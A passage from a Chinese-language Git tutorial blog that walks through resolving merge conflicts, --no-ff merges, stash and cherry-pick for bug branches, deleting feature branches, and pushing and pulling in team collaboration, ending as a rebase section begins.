<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329141304.png" alt="git-br-feature1"></p>
<p>这种情况下，Git无法执行“快速合并”，只能试图把各自的修改合并起来，但这种合并就可能会有冲突，试试看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge feature1</span><br><span class="line">Auto-merging readme.TXT</span><br><span class="line">CONFLICT (content): Merge conflict in readme.TXT</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>

<p>果然冲突了！Git告诉我们，<code>readme.txt</code>文件存在冲突，必须手动解决冲突后再提交。<code>git status</code>也可以告诉我们冲突的文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is ahead of &#39;origin&#x2F;master&#39; by 2 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">You have unmerged paths.</span><br><span class="line">  (fix conflicts and run &quot;git commit&quot;)</span><br><span class="line">  (use &quot;git merge --abort&quot; to abort the merge)</span><br><span class="line"></span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to mark resolution)</span><br><span class="line">        both modified:   readme.TXT</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>

<p>直接查看readme.txt的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world</span><br><span class="line">my name is Mr.Z</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">create a new branch is quick &amp; simple</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">create a new branch is quick and simple</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1</span><br></pre></td></tr></table></figure>

<p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容，我们修改如下后保存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create a new branch is quick AND simple</span><br></pre></td></tr></table></figure>

<p>再提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.TXT</span><br><span class="line">$ git commit -m &quot;conflict fixed&quot;</span><br><span class="line">[master 3f3da41] conflict fixed</span><br></pre></td></tr></table></figure>

<p>现在，<code>master</code>分支和<code>feature1</code>分支变成了下图所示：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329142106.png" alt="git-br-conflict-merged"></p>
<p>用带参数的<code>git log</code>也可以看到分支的合并情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">*   3f3da41 (HEAD -&gt; master) conflict fixed</span><br><span class="line">|\</span><br><span class="line">| * ed139c7 (feature1) and simple</span><br><span class="line">* | 2e6e1d3 &amp; simple</span><br><span class="line">|&#x2F;</span><br><span class="line">* b987052 (dev) new branch</span><br><span class="line">* 62b1052 (origin&#x2F;master) add my name</span><br><span class="line">* 794d914 write a readme file</span><br></pre></td></tr></table></figure>

<p>最后，删除<code>feature1</code>分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d feature1</span><br><span class="line">Deleted branch feature1 (was ed139c7).</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
<p>用<code>git log --graph</code>命令可以看到分支合并图。</p>
<h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><p>通常，合并分支时，如果可能，Git会用<code>Fast forward</code>模式，但这种模式下，删除分支后，会丢掉分支信息。</p>
<p>如果要强制禁用<code>Fast forward</code>模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p>
<p>下面实战一下<code>--no-ff</code>方式的<code>git merge</code>：</p>
<p>首先，仍然创建并切换<code>dev</code>分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch -c dev</span><br><span class="line">Switched to a new branch &#39;dev&#39;</span><br></pre></td></tr></table></figure>

<p>修改readme.txt文件，并提交一个新的commit：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.TXT</span><br><span class="line">$ git commit -m &quot;add merge&quot;</span><br><span class="line">[dev 60c3826] add merge</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure>

<p>现在，我们切换回<code>master</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch master</span><br><span class="line">Switched to branch &#39;master&#39;</span><br><span class="line">Your branch is ahead of &#39;origin&#x2F;master&#39; by 4 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br></pre></td></tr></table></figure>

<p>准备合并<code>dev</code>分支，请注意<code>--no-ff</code>参数，表示禁用<code>Fast forward</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge --no-ff -m &quot;merge with no-ff&quot; dev</span><br><span class="line">Merge made by the &#39;recursive&#39; strategy.</span><br><span class="line"> readme.TXT | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure>

<p>因为本次合并要创建一个新的commit，所以加上<code>-m</code>参数，把commit描述写进去。</p>
<p>合并后，我们用<code>git log</code>看看分支历史：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">*   d1cc368 (HEAD -&gt; master) merge with no-ff</span><br><span class="line">|\</span><br><span class="line">| * 60c3826 (dev) add merge</span><br><span class="line">|&#x2F;</span><br><span class="line">*   3f3da41 conflict fixed  &#x2F;&#x2F;下面都是之前的</span><br><span class="line">|\</span><br><span class="line">| * ed139c7 and simple</span><br><span class="line">* | 2e6e1d3 &amp; simple</span><br><span class="line">|&#x2F;</span><br><span class="line">* b987052 new branch</span><br><span class="line">* 62b1052 (origin&#x2F;master) add my name</span><br><span class="line">* 794d914 write a readme file</span><br></pre></td></tr></table></figure>

<p>可以看到，不使用<code>Fast forward</code>模式，merge后就像这样：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329143838.png" alt="git-no-ff-mode"></p>
<p>分支策略</p>
<p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
<p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
<p>那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；</p>
<p>你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。</p>
<p>所以，团队合作的分支看起来就像这样：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210329143949.png" alt="git-br-policy"></p>
<p>小结：</p>
<p>Git分支十分强大，在团队开发中应该充分应用。</p>
<p>合并分支时，加上<code>--no-ff</code>参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而<code>fast forward</code>合并就看不出来曾经做过合并。</p>
<h3 id="Bug分支"><a href="#Bug分支" class="headerlink" title="Bug分支"></a>Bug分支</h3><p>软件开发中，bug就像家常便饭一样。有了bug就需要修复，在Git中，由于分支是如此的强大，所以，每个bug都可以通过一个新的临时分支来修复，修复后，合并分支，然后将临时分支删除。</p>
<p>当你接到一个修复一个代号101的bug的任务时，很自然地，你想创建一个分支<code>issue-101</code>来修复它，但是，等等，当前正在<code>dev</code>上进行的工作还没有提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch dev</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">	new file:   hello.py</span><br><span class="line"></span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	modified:   readme.txt</span><br></pre></td></tr></table></figure>

<p>并不是你不想提交，而是工作只进行到一半，还没法提交，预计完成还需1天时间。但是，必须在两个小时内修复该bug，怎么办？</p>
<p>幸好，Git还提供了一个<code>stash</code>功能，可以把当前工作现场“储藏”起来，等以后恢复现场后继续工作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">Saved working directory and index state WIP on dev: f52c633 add merge</span><br></pre></td></tr></table></figure>

<p>现在，用<code>git status</code>查看工作区，就是干净的（除非有没有被Git管理的文件），因此可以放心地创建分支来修复bug。</p>
<p>首先确定要在哪个分支上修复bug，假定需要在<code>master</code>分支上修复，就从<code>master</code>创建临时分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &#39;master&#39;</span><br><span class="line">Your branch is ahead of &#39;origin&#x2F;master&#39; by 6 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">$ git checkout -b issue-101</span><br><span class="line">Switched to a new branch &#39;issue-101&#39;</span><br></pre></td></tr></table></figure>

<p>现在修复bug，需要把“Git is free software …”改为“Git is a free software …”，然后提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt </span><br><span class="line">$ git commit -m &quot;fix bug 101&quot;</span><br><span class="line">[issue-101 4c805e2] fix bug 101</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>修复完成后，切换到<code>master</code>分支，并完成合并，最后删除<code>issue-101</code>分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch master</span><br><span class="line">Switched to branch &#39;master&#39;</span><br><span class="line">Your branch is ahead of &#39;origin&#x2F;master&#39; by 6 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">$ git merge --no-ff -m &quot;merged bug fix 101&quot; issue-101</span><br><span class="line">Merge made by the &#39;recursive&#39; strategy.</span><br><span class="line"> readme.txt | 2 +-</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>原计划两个小时的bug修复只花了5分钟！现在，是时候接着回到<code>dev</code>分支干活了！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch dev</span><br><span class="line">Switched to branch &#39;dev&#39;</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>工作区是干净的，刚才的工作现场存到哪去了？用<code>git stash list</code>命令看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash list</span><br><span class="line">stash@&#123;0&#125;: WIP on dev: f52c633 add merge</span><br></pre></td></tr></table></figure>

<p>工作现场还在，Git把stash内容存在某个地方了，但是需要恢复一下，有两个办法：</p>
<p>一是用<code>git stash apply</code>恢复，但是恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p>
<p>另一种方式是用<code>git stash pop</code>，恢复的同时把stash内容也删了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash pop</span><br><span class="line">On branch dev</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">	new file:   hello.py</span><br><span class="line"></span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	modified:   readme.txt</span><br><span class="line"></span><br><span class="line">Dropped refs&#x2F;stash@&#123;0&#125; (5d677e2ee266f39ea296182fb2354265b91b3b2a)</span><br></pre></td></tr></table></figure>

<p>再用<code>git stash list</code>查看，就看不到任何stash内容了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash list</span><br></pre></td></tr></table></figure>

<p>你可以多次stash，恢复的时候，先用<code>git stash list</code>查看，然后恢复指定的stash，用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash apply stash@&#123;0&#125;</span><br></pre></td></tr></table></figure>

<p>在master分支上修复了bug后，我们要想一想，dev分支是早期从master分支分出来的，所以，这个bug其实在当前dev分支上也存在。</p>
<p>那怎么在dev分支上修复同样的bug？重复操作一次，提交不就行了？</p>
<p>有木有更简单的方法？</p>
<p>有！</p>
<p>同样的bug，要在dev上修复，我们只需要把<code>4c805e2 fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code>4c805e2 fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p>
<p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line">$ git cherry-pick 4c805e2</span><br><span class="line">[master 1d4b803] fix bug 101</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>Git自动给dev分支做了一次提交，注意这次提交的commit是<code>1d4b803</code>，它并不同于master的<code>4c805e2</code>，因为这两个commit只是改动相同，但确实是两个不同的commit。用<code>git cherry-pick</code>，我们就不需要在dev分支上手动再把修bug的过程重复一遍。</p>
<p>有些聪明的童鞋会想了，既然可以在master分支上修复bug后，在dev分支上可以“重放”这个修复过程，那么直接在dev分支上修复bug，然后在master分支上“重放”行不行？当然可以，不过你仍然需要<code>git stash</code>命令保存现场，才能从dev分支切换到master分支。</p>
<p>小结：</p>
<p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p>
<p>当手头工作没有完成时，先把工作现场<code>git stash</code>一下，然后去修复bug，修复后，再<code>git stash pop</code>，回到工作现场；</p>
<p>在master分支上修复的bug，想要合并到当前dev分支，可以用<code>git cherry-pick &lt;commit&gt;</code>命令，把bug提交的修改“复制”到当前分支，避免重复劳动。</p>
<h3 id="Feature分支"><a href="#Feature分支" class="headerlink" title="Feature分支"></a>Feature分支</h3><p>软件开发中，总有无穷无尽的新的功能要不断添加进来。</p>
<p>添加一个新功能时，你肯定不希望因为一些实验性质的代码，把主分支搞乱了，所以，每添加一个新功能，最好新建一个feature分支，在上面开发，完成后，合并，最后，删除该feature分支。</p>
<p>现在，你终于接到了一个新任务：开发代号为Vulcan的新功能，该功能计划用于下一代星际飞船。</p>
<p>于是准备开发：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch -c feature-vulcan</span><br><span class="line">Switched to a new branch &#39;feature-vulcan&#39;</span><br></pre></td></tr></table></figure>

<p>5分钟后，开发完毕：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add vulcan.py</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch feature-vulcan</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">	new file:   vulcan.py</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;add feature vulcan&quot;</span><br><span class="line">[feature-vulcan 287773e] add feature vulcan</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 vulcan.py</span><br></pre></td></tr></table></figure>

<p>切回<code>dev</code>，准备合并：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git switch dev</span><br></pre></td></tr></table></figure>

<p>一切顺利的话，feature分支和bug分支是类似的，合并，然后删除。</p>
<p>但是！</p>
<p>就在此时，接到上级命令，因经费不足，新功能必须取消！</p>
<p>虽然白干了，但是这个包含机密资料的分支还是必须就地销毁：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d feature-vulcan</span><br><span class="line">error: The branch &#39;feature-vulcan&#39; is not fully merged.</span><br><span class="line">If you are sure you want to delete it, run &#39;git branch -D feature-vulcan&#39;.</span><br></pre></td></tr></table></figure>

<p>销毁失败。Git友情提醒，<code>feature-vulcan</code>分支还没有被合并，如果删除，将丢失掉修改，如果要强行删除，需要使用大写的<code>-D</code>参数。。</p>
<p>现在我们强行删除：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -D feature-vulcan</span><br><span class="line">Deleted branch feature-vulcan (was 287773e).</span><br></pre></td></tr></table></figure>

<p>终于删除成功！</p>
<p>小结：</p>
<p>开发一个新feature，最好新建一个分支；</p>
<p>如果要丢弃一个没有被合并过的分支，可以通过<code>git branch -D &lt;name&gt;</code>强行删除。</p>
<h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><p>当你从远程仓库克隆时，实际上Git自动把本地的<code>master</code>分支和远程的<code>master</code>分支对应起来了，并且，远程仓库的默认名称是<code>origin</code>。</p>
<p>要查看远程库的信息，用<code>git remote</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git remote</span><br><span class="line">origin</span><br></pre></td></tr></table></figure>

<p>或者，用<code>git remote -v</code>显示更详细的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:Tianzeee&#x2F;test.git (fetch)</span><br><span class="line">origin  git@github.com:Tianzeee&#x2F;test.git (push)</span><br></pre></td></tr></table></figure>

<p>上面显示了可以抓取和推送的<code>origin</code>的地址。如果没有推送权限，就看不到push的地址。</p>
<p>推送分支</p>
<p>推送分支，就是把该分支上的所有本地提交推送到远程库。推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>

<p>如果要推送其他分支，比如<code>dev</code>，就改成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin dev</span><br></pre></td></tr></table></figure>

<p>但是，并不是一定要把本地分支往远程推送，那么，哪些分支需要推送，哪些不需要呢？</p>
<p><code>master</code>分支是主分支，因此要时刻与远程同步；</p>
<p><code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</p>
<p>bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</p>
<p>feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</p>
<p>总之，就是在Git中，分支完全可以在本地自己藏着玩，是否推送，视你的心情而定！</p>
<p>抓取分支</p>
<p>多人协作时，大家都会往<code>master</code>和<code>dev</code>分支上推送各自的修改。</p>
<p>现在，模拟一个你的小伙伴，可以在另一台电脑（注意要把SSH Key添加到GitHub）或者同一台电脑的另一个目录下克隆：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone git@github.com:michaelliao&#x2F;learngit.git</span><br><span class="line">Cloning into &#39;learngit&#39;...</span><br><span class="line">remote: Counting objects: 40, done.</span><br><span class="line">remote: Compressing objects: 100% (21&#x2F;21), done.</span><br><span class="line">remote: Total 40 (delta 14), reused 40 (delta 14), pack-reused 0</span><br><span class="line">Receiving objects: 100% (40&#x2F;40), done.</span><br><span class="line">Resolving deltas: 100% (14&#x2F;14), done.</span><br></pre></td></tr></table></figure>

<p>当你的小伙伴从远程库clone时，默认情况下，你的小伙伴只能看到本地的<code>master</code>分支。不信可以用<code>git branch</code>命令看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure>

<p>现在，你的小伙伴要在<code>dev</code>分支上开发，就必须创建远程<code>origin</code>的<code>dev</code>分支到本地，于是他用这个命令创建本地<code>dev</code>分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev origin&#x2F;dev</span><br></pre></td></tr></table></figure>

<p>现在，他就可以在<code>dev</code>上继续修改，然后，时不时地把<code>dev</code>分支<code>push</code>到远程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add env.txt</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;add env&quot;</span><br><span class="line">[dev 7a5e5dd] add env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line">$ git push origin dev</span><br><span class="line">Counting objects: 3, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (2&#x2F;2), done.</span><br><span class="line">Writing objects: 100% (3&#x2F;3), 308 bytes | 308.00 KiB&#x2F;s, done.</span><br><span class="line">Total 3 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line">   f52c633..7a5e5dd  dev -&gt; dev</span><br></pre></td></tr></table></figure>

<p>你的小伙伴已经向<code>origin/dev</code>分支推送了他的提交，而碰巧你也对同样的文件作了修改，并试图推送：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat env.txt</span><br><span class="line">env</span><br><span class="line"></span><br><span class="line">$ git add env.txt</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;add new env&quot;</span><br><span class="line">[dev 7bd91f1] add new env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line">$ git push origin dev</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (non-fast-forward)</span><br><span class="line">error: failed to push some refs to &#39;git@github.com:michaelliao&#x2F;learngit.git&#39;</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: &#39;git pull ...&#39;) before pushing again.</span><br><span class="line">hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details.</span><br></pre></td></tr></table></figure>

<p>推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用<code>git pull</code>把最新的提交从<code>origin/dev</code>抓下来，然后，在本地合并，解决冲突，再推送：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">There is no tracking information for the current branch.</span><br><span class="line">Please specify which branch you want to merge with.</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to set tracking information for this branch you can do so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to&#x3D;origin&#x2F;&lt;branch&gt; dev</span><br></pre></td></tr></table></figure>

<p><code>git pull</code>也失败了，原因是没有指定本地<code>dev</code>分支与远程<code>origin/dev</code>分支的链接，根据提示，设置<code>dev</code>和<code>origin/dev</code>的链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch --set-upstream-to&#x3D;origin&#x2F;dev dev</span><br><span class="line">Branch &#39;dev&#39; set up to track remote branch &#39;dev&#39; from &#39;origin&#39;.</span><br></pre></td></tr></table></figure>

<p>再pull：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">Auto-merging env.txt</span><br><span class="line">CONFLICT (add&#x2F;add): Merge conflict in env.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>

<p>这回<code>git pull</code>成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的解决冲突完全一样。解决后，提交，再push：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;fix env conflict&quot;</span><br><span class="line">[dev 57c53ab] fix env conflict</span><br><span class="line"></span><br><span class="line">$ git push origin dev</span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4&#x2F;4), done.</span><br><span class="line">Writing objects: 100% (6&#x2F;6), 621 bytes | 621.00 KiB&#x2F;s, done.</span><br><span class="line">Total 6 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line">   7a5e5dd..57c53ab  dev -&gt; dev</span><br></pre></td></tr></table></figure>

<p>因此，多人协作的工作模式通常是这样：</p>
<ol>
<li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li>
<li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</li>
<li>如果合并有冲突，则解决冲突，并在本地提交；</li>
<li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</li>
</ol>
<p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。</p>
<p>这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p>
<p>小结：</p>
<p>查看远程库信息，使用<code>git remote -v</code>；</p>
<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
<p>从本地推送分支，使用<code>git push origin branch-name</code>，如果推送失败，先用<code>git pull</code>抓取远程的新提交；</p>
<p>在本地创建和远程分支对应的分支，使用<code>git checkout -b branch-name origin/branch-name</code>，本地和远程分支的名称最好一致；</p>
<p>建立本地分支和远程分支的关联，使用<code>git branch --set-upstream branch-name origin/branch-name</code>；</p>
<p>从远程抓取分支，使用<code>git pull</code>，如果有冲突，要先处理冲突。</p>
<h3 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h3><p>在上一节我们看到了，多人在同一个分支上协作时，很容易出现冲突。即使没有冲突，后push的童鞋不得不先pull，在本地合并，然后才能push成功。</p>
<p>每次合并再push后，分支变成了这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">* d1be385 (HEAD -&gt; master, origin&#x2F;master) init hello</span><br><span class="line">*   e5e69f1 Merge branch &#39;dev&#39;</span><br><span class="line">|\  </span><br><span class="line">| *   57c53ab (origin&#x2F;dev, dev) fix env conflict</span><br><span class="line">| |\  </span><br><span class="line">| | * 7a5e5dd add env</span><br><span class="line">| * | 7bd91f1 add new env</span><br><span class="line">| |&#x2F;  </span><br><span class="line">* |   12a631b merged bug fix 101</span><br><span class="line">|\ \  </span><br><span class="line">| * | 4c805e2 fix bug 101</span><br><span class="line">|&#x2F; &#x2F;  </span><br><span class="line">* |   e1e9c68 merge with no-ff</span><br><span class="line">|\ \  </span><br><span class="line">| |&#x2F;  </span><br><span class="line">| * f52c633 add merge</span><br><span class="line">|&#x2F;  </span><br><span class="line">*   cf810e4 conflict fixed</span><br></pre></td></tr></table></figure>

<p>总之看上去很乱，有强迫症的童鞋会问：为什么Git的提交历史不能是一条干净的直线？</p>
<p>其实是可以做到的！</p>
<p>Git有一种称为rebase的操作，有人把它翻译成“变基”。</p>
<p>在和远程分支同步后，我们对<code>hello.py</code>这个文件做了两次提交。用<code>git log</code>命令看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">* 582d922 (HEAD -&gt; master) add author</span><br><span class="line">* 8875536 add comment</span><br><span class="line">* d1be385 (origin&#x2F;master) init hello</span><br><span class="line">*   e5e69f1 Merge branch &#39;dev&#39;</span><br><span class="line">|\  </span><br><span class="line">| *   57c53ab (origin&#x2F;dev, dev) fix env conflict</span><br><span class="line">| |\  </span><br><span class="line">| | * 7a5e5dd add env</span><br><span class="line">| * | 7bd91f1 add new env</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>注意到Git用<code>(HEAD -&gt; master)</code>和<code>(origin/master)</code>标识出当前分支的HEAD和远程origin的位置分别是<code>582d922 add author</code>和<code>d1be385 init hello</code>，本地分支比远程分支快两个提交。</p>
<p>现在我们尝试推送本地分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin master</span><br><span class="line">To github.com:michaelliao&#x2F;learngit.git</span><br><span class="line"> ! [rejected]        master -&gt; master (fetch first)</span><br><span class="line">error: failed to push some refs to &#39;git@github.com:michaelliao&#x2F;learngit.git&#39;</span><br><span class="line">hint: Updates were rejected because the remote contains work that you do</span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., &#39;git pull ...&#39;) before pushing again.</span><br><span class="line">hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details.</span><br></pre></td></tr></table></figure>

<p>很不幸，失败了，这说明有人先于我们推送了远程分支。按照经验，先pull一下：</p>
